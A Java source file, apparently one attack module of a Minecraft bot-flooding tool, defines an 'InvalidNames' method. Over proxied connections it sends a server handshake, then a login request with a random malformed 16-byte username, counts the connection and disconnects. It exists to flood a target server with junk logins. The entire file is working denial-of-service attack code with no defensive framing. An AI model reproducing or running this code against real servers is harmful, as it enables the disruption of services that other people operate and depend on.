package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.nio.charset.Charset;
import java.util.Random;

import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;
import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;
import ml.dima_dencep.bettermcbot.minecraftutils.LoginRequest;

public class InvalidNames implements Method {
   private Handshake handshake;
   private byte[] bytes;

   private String randomString(int len) {
      byte[] array = new byte[len];
      (new Random()).nextBytes(array);
      return new String(array, Charset.forName("UTF-8"));
   }

   public InvalidNames() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(this.randomString(16))).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
